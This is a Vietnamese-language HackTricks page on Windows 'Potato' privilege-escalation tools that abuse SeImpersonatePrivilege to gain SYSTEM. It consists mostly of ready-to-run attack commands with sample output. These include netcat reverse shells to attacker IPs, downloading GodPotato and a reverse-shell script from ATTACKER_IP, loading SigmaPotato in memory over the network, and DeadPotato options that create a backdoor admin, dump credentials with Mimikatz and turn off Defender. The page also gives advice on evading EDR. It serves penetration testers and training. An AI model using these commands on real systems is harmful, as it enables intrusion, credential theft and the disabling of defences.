# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato không hoạt động** trên Windows Server 2019 và Windows 10 build 1809 trở lên. Tuy nhiên, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** có thể được dùng để **khai thác các quyền tương tự và đạt quyền truy cập cấp `NT AUTHORITY\SYSTEM`**. Bài [blog này](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) phân tích chuyên sâu về công cụ `PrintSpoofer`, có thể dùng để khai thác các quyền mạo danh trên các máy Windows 10 và Server 2019, nơi JuicyPotato không còn hoạt động.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Một giải pháp thay thế hiện đại được duy trì thường xuyên trong giai đoạn 2024–2025 là SigmaPotato (một fork của GodPotato), bổ sung khả năng sử dụng reflection trong bộ nhớ/.NET và hỗ trợ thêm các phiên bản OS. Xem cách sử dụng nhanh bên dưới và repo trong References.

Các trang liên quan về kiến thức nền và kỹ thuật thủ công:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Yêu cầu và các vấn đề thường gặp

Tất cả các kỹ thuật sau đây đều dựa vào việc khai thác một service đặc quyền có khả năng mạo danh trong ngữ cảnh có một trong các quyền sau:

- SeImpersonatePrivilege (phổ biến nhất) hoặc SeAssignPrimaryTokenPrivilege
- Không cần mức toàn vẹn cao nếu token đã có SeImpersonatePrivilege (thường gặp ở nhiều tài khoản service như IIS AppPool, MSSQL, v.v.)

Kiểm tra nhanh các quyền:

```cmd
whoami /priv | findstr /i impersonate
```

Ghi chú vận hành:

- Nếu shell của bạn chạy dưới token bị hạn chế, không có SeImpersonatePrivilege (thường gặp với Local Service/Network Service trong một số ngữ cảnh), hãy khôi phục các quyền mặc định của tài khoản bằng FullPowers, rồi chạy một Potato. Ví dụ: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Token của một tiến trình có thể có ít quyền hơn token khác thuộc cùng tài khoản dịch vụ hoặc phiên đăng nhập. Trong một số cấu hình, một client named pipe trong cùng phiên có thể cung cấp token khác có SeImpersonatePrivilege, nhưng `RequiredPrivileges` được cấu hình cho dịch vụ và `whoami /priv` thể hiện những thông tin khác nhau; chúng không chứng minh rằng có thể sử dụng token như vậy. Hãy xác minh token thực tế trước khi xem xét hướng impersonation.
- PrintSpoofer cần dịch vụ Print Spooler đang chạy và có thể truy cập qua endpoint RPC cục bộ (spoolss). Trong các môi trường được harden, nơi Spooler bị tắt sau PrintNightmare, hãy ưu tiên RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato cần có thể truy cập OXID resolver qua TCP/135. Nếu egress bị chặn, hãy dùng redirector/port-forwarder (xem ví dụ bên dưới). Kiểm tra các flag được build đang dùng hỗ trợ.
- EfsPotato/SharpEfsPotato khai thác MS-EFSR; nếu một pipe bị chặn, hãy thử các pipe khác (lsarpc, efsrpc, samr, lsass, netlogon).
- Lỗi 0x6d3 trong lúc gọi RpcBindingSetAuthInfo thường cho biết dịch vụ xác thực RPC không xác định/không được hỗ trợ; hãy thử pipe/transport khác hoặc đảm bảo dịch vụ đích đang chạy.
- Các fork “Kitchen-sink” như DeadPotato tích hợp thêm các module payload (Mimikatz/SharpHound/Defender off) có thao tác trên ổ đĩa; hãy dự kiến mức độ bị EDR phát hiện cao hơn so với các bản gốc tinh gọn.

## Bản demo nhanh

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Ghi chú:
- Bạn có thể dùng -i để khởi chạy một tiến trình tương tác trong console hiện tại, hoặc -c để chạy một lệnh một dòng.
- Cần có dịch vụ Spooler. Nếu dịch vụ này bị tắt, cách này sẽ thất bại.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

Trong [cách sử dụng upstream](https://github.com/antonioCoco/RoguePotato#usage), `-e` chỉ định lệnh, `-l` chọn cổng local resolver và `-c` tùy chọn chỉ định CLSID. Nếu kích hoạt COM khởi chạy một service có đường dẫn executable đã bị sửa đổi, service đó có thể thực thi lệnh đã thay đổi mà không cần impersonation token; hãy kiểm tra cấu hình service trước khi quy việc thực thi với quyền SYSTEM quan sát được cho kỹ thuật này.

Nếu outbound 135 bị chặn, hãy chuyển hướng OXID resolver qua socat trên redirector của bạn:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato là một primitive lạm dụng COM mới hơn, được phát hành vào cuối năm 2022, nhắm vào dịch vụ **PrintNotify** thay vì Spooler/BITS. Binary khởi tạo COM server PrintNotify, thay thế bằng một `IUnknown` giả, rồi kích hoạt callback có đặc quyền thông qua `CreatePointerMoniker`. Khi dịch vụ PrintNotify (chạy dưới quyền **SYSTEM**) kết nối ngược lại, process sẽ sao chép token nhận được và khởi chạy payload được cung cấp với đầy đủ đặc quyền.<sup>[[13]](#references)</sup>

Các lưu ý vận hành chính:

* Hoạt động trên Windows 10/11 và Windows Server 2012–2022, miễn là dịch vụ Print Workflow/PrintNotify được cài đặt (dịch vụ này vẫn hiện diện ngay cả khi Spooler cũ bị tắt sau PrintNightmare).
* Yêu cầu ngữ cảnh gọi có **SeImpersonatePrivilege** (thường gặp ở các tài khoản dịch vụ IIS APPPOOL, MSSQL và tác vụ đã lên lịch).
* Chấp nhận lệnh trực tiếp hoặc chế độ tương tác để bạn có thể tiếp tục làm việc trong console ban đầu. Ví dụ:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Vì hoàn toàn dựa trên COM, không cần listener named pipe hay redirector bên ngoài, nên đây là bản thay thế trực tiếp trên các host nơi Defender chặn RPC binding của RoguePotato.

Các operator như Ink Dragon chạy PrintNotifyPotato ngay sau khi giành được ViewState RCE trên SharePoint để chuyển từ worker `w3wp.exe` sang SYSTEM trước khi cài đặt ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Mẹo: Nếu một pipe không hoạt động hoặc EDR chặn nó, hãy thử các pipe khác được hỗ trợ:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Ghi chú:
- Hoạt động trên Windows 8/8.1–11 và Server 2012–2022 khi có SeImpersonatePrivilege.
- Tải binary phù hợp với runtime đã cài đặt (ví dụ: `GodPotato-NET4.exe` trên Server 2022 hiện đại).
- Nếu primitive thực thi ban đầu của bạn là webshell/UI có thời gian chờ ngắn, hãy chuẩn bị payload dưới dạng script và yêu cầu GodPotato chạy script đó thay vì dùng một lệnh inline dài.<sup>[[12]](#references)</sup>

Mẫu staging nhanh từ webroot IIS có quyền ghi:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato cung cấp hai biến thể nhắm vào các đối tượng DCOM dịch vụ mặc định sử dụng RPC_C_IMP_LEVEL_IMPERSONATE. Hãy build hoặc sử dụng các binary được cung cấp rồi chạy lệnh của bạn:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (bản fork GodPotato đã cập nhật)

SigmaPotato bổ sung các tiện ích hiện đại như thực thi trong bộ nhớ thông qua .NET reflection và công cụ hỗ trợ reverse shell bằng PowerShell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Các tính năng bổ sung trong các bản build 2024–2025 (v1.2.x):
- Tùy chọn reverse shell tích hợp sẵn `--revshell` và loại bỏ giới hạn 1024 ký tự của PowerShell, cho phép chạy payload vượt qua AMSI dài chỉ trong một lần.
- Cú pháp tương thích với Reflection (`[SigmaPotato]::Main()`), cùng một thủ thuật né tránh AV sơ đẳng bằng `VirtualAllocExNuma()` để đánh lạc hướng các heuristic đơn giản.
- `SigmaPotatoCore.exe` riêng, được biên dịch cho .NET 2.0 để dùng trong môi trường PowerShell Core.

### DeadPotato (bản làm lại GodPotato năm 2024 với các module)

DeadPotato giữ nguyên chuỗi giả mạo OXID/DCOM của GodPotato nhưng tích hợp sẵn các công cụ hỗ trợ hậu khai thác, giúp operator có thể giành quyền SYSTEM ngay lập tức và thực hiện persistence/thu thập dữ liệu mà không cần công cụ bổ sung.<sup>[[15]](#references)</sup>

Các module thường dùng (đều yêu cầu SeImpersonatePrivilege):

- `-cmd "<cmd>"` — chạy lệnh bất kỳ dưới quyền SYSTEM.
- `-rev <ip:port>` — reverse shell nhanh.
- `-newadmin user:pass` — tạo tài khoản admin cục bộ để persistence.
- `-mimi sam|lsa|all` — thả và chạy Mimikatz để dump thông tin xác thực (ghi dữ liệu ra đĩa, dễ bị phát hiện).
- `-sharphound` — chạy SharpHound để thu thập dữ liệu dưới quyền SYSTEM.
- `-defender off` — tắt tính năng bảo vệ thời gian thực của Defender (rất dễ bị phát hiện).

Ví dụ lệnh một dòng:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Vì nó đi kèm thêm các binary, hãy dự kiến AV/EDR sẽ cảnh báo nhiều hơn; hãy dùng GodPotato/SigmaPotato gọn nhẹ hơn khi cần stealth.

## References

- [1] [PrintSpoofer – Lạm dụng quyền mạo danh trên Windows 10 và Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato không còn nữa? Chuyện cũ, chào mừng RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Khôi phục các quyền mặc định của token cho tài khoản dịch vụ](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP làm lộ NTLM → NTFS junction tới webroot dẫn đến RCE → FullPowers + GodPotato để lên SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — Macro LibreOffice → webshell IIS → GodPotato để lên SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng relay và cách thức hoạt động bên trong của một chiến dịch tấn công lén lút](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Bản làm lại GodPotato tích hợp sẵn các module hậu khai thác](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
